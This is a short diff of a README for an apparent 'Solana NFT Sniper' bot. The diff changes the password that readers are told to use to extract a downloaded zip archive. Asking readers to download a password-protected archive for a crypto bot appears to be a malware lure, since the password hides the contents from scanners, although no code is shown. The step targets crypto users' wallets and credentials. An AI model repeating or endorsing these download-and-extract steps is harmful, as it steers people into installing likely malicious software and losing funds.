@@ -30,7 +30,7 @@ Welcome to Solana NFT Sniper, your cutting-edge solution for snipping NFTs on th
 ## Getting Started
 
 - [Clone](https://github.com/medlaare/solana-nft-sniper/archive/refs/heads/main.zip) the repository and follow the step-by-step setup guide in the documentation.
-- Extract archive with password `x`
+- Extract archive with password `GgX2qVdUt`
 - `Customize the bot's configuration` to match your sniping strategy and preferences.
 - Run the bot and start sniping NFTs on the Solana blockchain effortlessly.
 
